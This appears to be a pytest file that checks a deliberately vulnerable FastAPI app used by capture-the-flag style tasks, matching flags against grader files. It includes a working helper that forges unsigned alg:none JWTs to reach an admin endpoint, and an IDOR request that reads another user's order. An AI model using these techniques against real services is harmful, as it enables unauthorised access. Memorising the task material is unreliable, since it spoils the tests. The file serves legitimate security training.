"""The vulnerable API must be genuinely exploitable, and its flags must match the
grader/expected.json of the tasks it backs (071 IDOR, 072 JWT alg:none)."""

from __future__ import annotations

import base64
import json
import sys
from pathlib import Path

from fastapi.testclient import TestClient

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from app import app  # noqa: E402

client = TestClient(app)
TASKS = ROOT.parent / "tasks"


def _b64u(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")


def _forge_alg_none(payload: dict) -> str:
    header = _b64u(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    body = _b64u(json.dumps(payload).encode())
    return f"{header}.{body}."  # empty signature


def _token() -> str:
    return client.post("/login", json={"username": "demo", "password": "demo"}).json()["access_token"]


def _expected(task_id: str) -> str:
    return json.loads((TASKS / task_id / "grader" / "expected.json").read_text())["value"]


def test_idor_reads_another_users_order():
    tok = _token()
    hdr = {"Authorization": f"Bearer {tok}"}

    # The learner's own order is mundane...
    own = client.get("/orders/1002", headers=hdr)
    assert own.status_code == 200
    assert "FLAG" not in own.text

    # ...tampering with the id reveals another user's order + the flag.
    idor = client.get("/orders/1337", headers=hdr)
    assert idor.status_code == 200
    assert idor.json()["note"] == _expected("071-idor-backend")


def test_admin_requires_forged_alg_none_token():
    # A normal user token is rejected by /admin.
    normal = {"Authorization": f"Bearer {_token()}"}
    assert client.get("/admin/ledger", headers=normal).status_code == 403

    # Forging an unsigned alg:none admin token gets in (the vulnerability).
    forged = {"Authorization": f"Bearer {_forge_alg_none({'sub': 'u1001', 'role': 'admin'})}"}
    resp = client.get("/admin/ledger", headers=forged)
    assert resp.status_code == 200
    assert resp.json()["flag"] == _expected("072-broken-auth-token-forgery")


def test_unauthenticated_is_rejected():
    assert client.get("/orders/1337").status_code == 401
    assert client.get("/admin/ledger").status_code == 401


def test_a_correctly_signed_but_non_admin_token_cannot_reach_admin():
    # Signature verification still works on the normal path — only alg:none is the hole.
    assert client.get("/admin/ledger", headers={"Authorization": f"Bearer {_token()}"}).status_code == 403
